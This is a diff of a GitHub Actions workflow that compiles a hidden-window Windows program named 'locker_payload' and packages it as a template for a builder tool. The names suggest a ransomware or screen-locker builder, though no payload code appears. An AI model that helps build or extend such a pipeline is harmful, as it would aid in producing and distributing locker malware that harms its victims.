@@ -21,7 +21,7 @@ jobs:
         choco install mingw -y
         echo "C:\tools\mingw64\bin" | Out-File -FilePath $env:GITHUB_PATH -Encoding utf8 -Append
 
-    - name: Copy locker.asm files
+    - name: Copy ASM files
       shell: cmd
       run: |
         mkdir builder\Resources 2>nul
@@ -34,12 +34,12 @@ jobs:
       with:
         dotnet-version: 6.0.x
 
-    - name: Compile Template
+    - name: Compile Template (MinGW)
       shell: cmd
       run: |
         set PATH=C:\tools\mingw64\bin;%PATH%
         cd template
-        g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lntdll
+        g++ -static -O2 -mwindows locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
         if exist locker_payload.exe (
           copy locker_payload.exe ..\builder\Resources\template.exe
           echo [SUCCESS] Template compiled
